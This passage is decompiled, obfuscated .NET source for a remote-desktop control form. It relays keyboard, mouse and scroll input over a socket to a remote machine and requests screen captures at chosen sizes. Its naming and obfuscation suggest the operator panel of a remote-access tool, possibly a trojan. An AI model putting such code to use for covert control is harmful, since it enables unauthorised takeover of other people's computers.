					this.sk.Send(string.Concat(new string[]
					{
						\u0006\u2001.\u0002(-1829129212),
						global::\u000E\u2000.\u000E,
						Conversions.ToString(2),
						global::\u000E\u2000.\u000E,
						Conversions.ToString(16)
					}));
				}
				else
				{
					this.sk.Send(string.Concat(new string[]
					{
						\u0006\u2001.\u0002(-1829129212),
						global::\u000E\u2000.\u000E,
						Conversions.ToString(2),
						global::\u000E\u2000.\u000E,
						Conversions.ToString((int)e.KeyCode)
					}));
				}
			}
			e.SuppressKeyPress = true;
		}

		// Token: 0x060003D9 RID: 985 RVA: 0x00029D2C File Offset: 0x00027F2C
		public void KDW(object s, KeyEventArgs e)
		{
			if (Operators.CompareString(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138894), false) == 0)
			{
				return;
			}
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Focus();
			if (this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Checked)
			{
				Keys keyCode = e.KeyCode;
				if (keyCode == Keys.Shift || keyCode == Keys.ShiftKey || keyCode == Keys.LShiftKey || keyCode == Keys.RShiftKey)
				{
					this.sk.Send(string.Concat(new string[]
					{
						\u0006\u2001.\u0002(-1829129212),
						global::\u000E\u2000.\u000E,
						Conversions.ToString(0),
						global::\u000E\u2000.\u000E,
						Conversions.ToString(16)
					}));
				}
				else
				{
					this.sk.Send(string.Concat(new string[]
					{
						\u0006\u2001.\u0002(-1829129212),
						global::\u000E\u2000.\u000E,
						Conversions.ToString(0),
						global::\u000E\u2000.\u000E,
						Conversions.ToString((int)e.KeyCode)
					}));
				}
			}
			e.SuppressKeyPress = true;
		}

		// Token: 0x060003DA RID: 986 RVA: 0x00029E4C File Offset: 0x0002804C
		private void \u0002(object \u0002, FormClosingEventArgs \u0003)
		{
			if (this.sk != null)
			{
				this.sk.CN = false;
			}
		}

		// Token: 0x060003DB RID: 987 RVA: 0x00029E68 File Offset: 0x00028068
		private void \u0002(object \u0002, EventArgs \u0003)
		{
			try
			{
				PictureBox obj = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
				lock (obj)
				{
					this.QQ = Conversions.ToString(global::\u000E\u2000.\u0002(this.osk.L));
					this.Text = this.QQ;
					Control control = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
					control.KeyUp += this.KUP;
					control.KeyDown += this.KDW;
					this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().SelectedIndex = Conversions.ToInteger(global::\u000E\u2000.\u0002.\u0002\u2000);
				}
				this.Folder = this.osk.Folder + \u0006\u2001.\u0002(-1829118362);
				if (!Directory.Exists(this.Folder))
				{
					Directory.CreateDirectory(this.Folder);
				}
				if (global::\u000E\u2000.\u0002.\u000F)
				{
					this.\u0005(RuntimeHelpers.GetObjectValue(\u0002), \u0003);
				}
				if (Operators.CompareString(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138894), false) != 0)
				{
					this.\u0008\u2000(RuntimeHelpers.GetObjectValue(\u0002), \u0003);
				}
			}
			catch (Exception ex)
			{
				this.Close();
			}
		}

		// Token: 0x060003DC RID: 988 RVA: 0x00029FD4 File Offset: 0x000281D4
		private void \u0003(object \u0002, EventArgs \u0003)
		{
			this.IsActive = true;
		}

		// Token: 0x060003DD RID: 989 RVA: 0x00029FE0 File Offset: 0x000281E0
		private void \u0002(object \u0002, MouseEventArgs \u0003)
		{
			this.\u0003\u2001 = \u0003.Location;
			if (this.\u0003\u2001.Y < 20)
			{
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Visible = true;
			}
			else
			{
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Visible = false;
			}
			PictureBox obj = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			lock (obj)
			{
				if ((!this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Focused & this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Checked) | this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Checked)
				{
					this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Focus();
				}
			}
		}

		// Token: 0x060003DE RID: 990 RVA: 0x0002A088 File Offset: 0x00028288
		private void \u0005(object \u0002, EventArgs \u0003)
		{
			if (Operators.CompareString(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138787), false) == 0)
			{
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138894);
				this.sk.Send(\u0006\u2001.\u0002(-1829118344));
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Enabled = true;
			}
			else
			{
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text = \u0006\u2001.\u0002(-1829138787);
				float num = (float)(Conversions.ToDouble(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text.Remove(0, 1)) / 100.0);
				Size size = checked(new Size((int)Math.Round((double)(unchecked((float)this.sz.Width * num) / 10f)) * 10, (int)Math.Round((double)(unchecked((float)this.sz.Height * num) / 10f)) * 10));
				this.sk.Send(string.Concat(new string[]
				{
					\u0006\u2001.\u0002(-1829138798),
					global::\u000E\u2000.\u000E,
					this.sk.ip(),
					global::\u000E\u2000.\u000E,
					Conversions.ToString(size.Width),
					\u0006\u2001.\u0002(-1829118385),
					Conversions.ToString(size.Height),
					global::\u000E\u2000.\u000E,
					\u0006\u2001.\u0002(-1829123299)
				}));
			}
		}

		// Token: 0x060003DF RID: 991 RVA: 0x0002A200 File Offset: 0x00028400
		private void \u0003(object \u0002, MouseEventArgs \u0003)
		{
			PictureBox obj = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			lock (obj)
			{
				if (this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Checked)
				{
					if (Operators.CompareString(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138894), false) != 0)
					{
						Point point = checked(new Point((int)Math.Round(unchecked((double)\u0003.X * ((double)this.sz.Width / (double)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Width))), (int)Math.Round(unchecked((double)\u0003.Y * ((double)this.sz.Height / (double)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Height)))));
						int value;
						if (\u0003.Button == MouseButtons.Left)
						{
							value = 2;
						}
						if (\u0003.Button == MouseButtons.Right)
						{
							value = 8;
						}
						this.sk.Send(string.Concat(new string[]
						{
							\u0006\u2001.\u0002(-1829138768),
							global::\u000E\u2000.\u000E,
							Conversions.ToString(point.X),
							global::\u000E\u2000.\u000E,
							Conversions.ToString(point.Y),
							global::\u000E\u2000.\u000E,
							Conversions.ToString(value)
						}));
					}
				}
			}
		}

		// Token: 0x060003E0 RID: 992 RVA: 0x0002A358 File Offset: 0x00028558
		private void \u0005(object \u0002, MouseEventArgs \u0003)
		{
			if (this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Checked)
			{
				if (Operators.CompareString(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138894), false) == 0)
				{
					return;
				}
				Point point = checked(new Point((int)Math.Round(unchecked((double)\u0003.X * ((double)this.sz.Width / (double)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Width))), (int)Math.Round(unchecked((double)\u0003.Y * ((double)this.sz.Height / (double)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Height)))));
				int value;
				if (\u0003.Button == MouseButtons.Left)
				{
					value = 4;
				}
				if (\u0003.Button == MouseButtons.Right)
				{
					value = 16;
				}
				this.sk.Send(string.Concat(new string[]
				{
					\u0006\u2001.\u0002(-1829138768),
					global::\u000E\u2000.\u000E,
					Conversions.ToString(point.X),
					global::\u000E\u2000.\u000E,
					Conversions.ToString(point.Y),
					global::\u000E\u2000.\u000E,
					Conversions.ToString(value)
				}));
			}
		}

		// Token: 0x060003E1 RID: 993 RVA: 0x0002A478 File Offset: 0x00028678
		private void \u0008(object \u0002, EventArgs \u0003)
		{
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Enabled = false;
			if (!this.osk.CN | !this.sk.CN)
			{
				this.sk.CN = false;
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Enabled = false;
				this.Text = \u0006\u2001.\u0002(-1829118393) + this.QQ;
				this.Close();
				return;
			}
			this.\u0005\u2001 = this.fps;
			this.fps = 0;
			if (this.\u0005\u2001 == 0)
			{
				this.pkt = 0L;
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Invalidate();
			}
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Enabled = true;
		}

		// Token: 0x060003E2 RID: 994 RVA: 0x0002A52C File Offset: 0x0002872C
		private void \u0008(object \u0002, MouseEventArgs \u0003)
		{
			PictureBox obj = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			lock (obj)
			{
				if (this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Checked)
				{
					if (Operators.CompareString(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138894), false) != 0)
					{
						this.sk.Send(string.Concat(new string[]
						{
							\u0006\u2001.\u0002(-1829138768),
							global::\u000E\u2000.\u000E,
							Conversions.ToString(\u0003.Delta),
							global::\u000E\u2000.\u000E,
							Conversions.ToString(this.\u0002\u2001.Y),
							global::\u000E\u2000.\u000E,
							Conversions.ToString(2048)
						}));
					}
				}
			}
		}

		// Token: 0x060003E3 RID: 995 RVA: 0x0002A604 File Offset: 0x00028804
		private void \u0006(object \u0002, EventArgs \u0003)
		{
			PictureBox obj = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			lock (obj)
			{
			}
		}

		// Token: 0x060003E4 RID: 996 RVA: 0x0002A63C File Offset: 0x0002883C
		private void \u000E(object \u0002, EventArgs \u0003)
		{
			PictureBox obj = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002();
			lock (obj)
			{
			}
		}

		// Token: 0x060003E5 RID: 997 RVA: 0x0002A674 File Offset: 0x00028874
		private void \u000F(object \u0002, EventArgs \u0003)
		{
			if (this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0005().Checked)
			{
				try
				{
					Process.Start(this.Folder);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060003E6 RID: 998 RVA: 0x0002A6C4 File Offset: 0x000288C4
		private void \u0002(object \u0002, PaintEventArgs \u0003)
		{
			string text = Conversions.ToString(this.\u0005\u2001) + \u0006\u2001.\u0002(-1829138756) + global::\u000E.\u0002(this.pkt);
			Size size = TextRenderer.MeasureText(text, new Font(this.Font, FontStyle.Bold));
			if (this.\u0003\u2001.X < size.Width & this.\u0003\u2001.Y < size.Height)
			{
				return;
			}
			Graphics graphics = \u0003.Graphics;
			Brush brush = new Pen(Color.FromArgb(100, 1, 1, 1)).Brush;
			Rectangle rect = new Rectangle(0, 0, size.Width, size.Height);
			graphics.FillRectangle(brush, rect);
			Brush brush2 = Brushes.Red;
			if (this.\u0005\u2001 > 3)
			{
				brush2 = Brushes.YellowGreen;
			}
			if (this.\u0005\u2001 > 6)
			{
				brush2 = Brushes.LimeGreen;
			}
			\u0003.Graphics.DrawString(text, new Font(this.Font, FontStyle.Bold), brush2, 0f, 0f);
		}

		// Token: 0x060003E7 RID: 999 RVA: 0x0002A7C0 File Offset: 0x000289C0
		private void \u0002\u2000(object \u0002, EventArgs \u0003)
		{
			this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Value = this.sk.rp();
			Point point = this.PointToClient(Cursor.Position);
			if (point.X > -1 & point.Y > -1 & this.IsActive)
			{
				this.\u000F\u2000 = checked(new Point((int)Math.Round(unchecked((double)point.X * ((double)this.sz.Width / (double)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Width))), (int)Math.Round(unchecked((double)point.Y * ((double)this.sz.Height / (double)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Height)))));
				if ((this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Checked & Operators.CompareString(this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Text, \u0006\u2001.\u0002(-1829138894), false) != 0) && this.\u000F\u2000 != this.\u0002\u2001)
				{
					this.\u0002\u2001 = this.\u000F\u2000;
					Client client = this.sk;
					string text = string.Concat(new string[]
					{
						\u0006\u2001.\u0002(-1829138768),
						global::\u000E\u2000.\u000E,
						Conversions.ToString(this.\u0002\u2001.X),
						global::\u000E\u2000.\u000E,
						Conversions.ToString(this.\u0002\u2001.Y),
						global::\u000E\u2000.\u000E,
						Conversions.ToString(1)
					});
					client.SEND_(global::\u000E.\u0002(ref text));
				}
			}
		}

		// Token: 0x060003E8 RID: 1000 RVA: 0x0002A934 File Offset: 0x00028B34
		private void \u0003\u2000(object \u0002, EventArgs \u0003)
		{
			this.IsActive = false;
		}

		// Token: 0x060003E9 RID: 1001 RVA: 0x0002A940 File Offset: 0x00028B40
		private void \u0005\u2000(object \u0002, EventArgs \u0003)
		{
		}

		// Token: 0x060003EA RID: 1002 RVA: 0x0002A944 File Offset: 0x00028B44
		private void \u0008\u2000(object \u0002, EventArgs \u0003)
		{
			if (!this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Visible)
			{
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Visible = true;
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().BackgroundImage = global::\u0002\u2001.\u0003();
			}
			else
			{
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Visible = false;
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().BackgroundImage = global::\u0002\u2001.\u0002();
			}
		}

		// Token: 0x060003EB RID: 1003 RVA: 0x0002A9A0 File Offset: 0x00028BA0
		private void \u0006\u2000(object \u0002, EventArgs \u0003)
		{
			checked
			{
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Left = (int)Math.Round(unchecked((double)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Width / 2.0 - (double)this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Width / 2.0));
				this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0003().Top = this.2x43ymuukdvahklgmmt4swyxe5tvcp8n\u200A\u2009\u2000\u2005\u0002().Top + 3;
			}
		}

		// Token: 0x04000237 RID: 567
		[AccessedThroughProperty("Panel1")]
		private Panel \u0003;

		// Token: 0x04000238 RID: 568
		[AccessedThroughProperty("ComboBox1")]
		private ComboBox \u0005;

		// Token: 0x04000239 RID: 569
		[AccessedThroughProperty("Label1")]
		private Label \u0008;

		// Token: 0x0400023A RID: 570
		[AccessedThroughProperty("Button1")]
		private Button \u0006;

		// Token: 0x0400023B RID: 571
		[AccessedThroughProperty("CheckBox2")]
		private CheckBox \u000E;

		// Token: 0x0400023C RID: 572
		[AccessedThroughProperty("CheckBox1")]
		private CheckBox \u000F;

		// Token: 0x0400023D RID: 573
		[AccessedThroughProperty("Timer1")]
		private Timer \u0002\u2000;

		// Token: 0x0400023E RID: 574
		[AccessedThroughProperty("CheckBox3")]
		private CheckBox \u0003\u2000;

		// Token: 0x0400023F RID: 575
		[AccessedThroughProperty("Timer2")]
		private Timer \u0005\u2000;

		// Token: 0x04000240 RID: 576
		[AccessedThroughProperty("P")]
		private PictureBox \u0008\u2000;

		// Token: 0x04000241 RID: 577
		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar \u0006\u2000;

		// Token: 0x04000242 RID: 578
		[AccessedThroughProperty("Button2")]
		private Button \u000E\u2000;

		// Token: 0x04000243 RID: 579
		public Client sk;

		// Token: 0x04000244 RID: 580
		public Client osk;

		// Token: 0x04000245 RID: 581
		public Size sz;

		// Token: 0x04000246 RID: 582
		public string QQ;

		// Token: 0x04000247 RID: 583
		public Bitmap Oimg;

		// Token: 0x04000248 RID: 584
		private Point \u000F\u2000;

		// Token: 0x04000249 RID: 585
		private Point \u0002\u2001;

		// Token: 0x0400024A RID: 586
		public int co;

		// Token: 0x0400024B RID: 587
		public string Folder;

		// Token: 0x0400024C RID: 588
		private Point \u0003\u2001;

		// Token: 0x0400024D RID: 589
		public bool IsActive;

		// Token: 0x0400024E RID: 590
		public int fps;

		// Token: 0x0400024F RID: 591
		private int \u0005\u2001;

		// Token: 0x04000250 RID: 592
		public long pkt;

		// Token: 0x04000251 RID: 593
		public long dbf;
	}
}
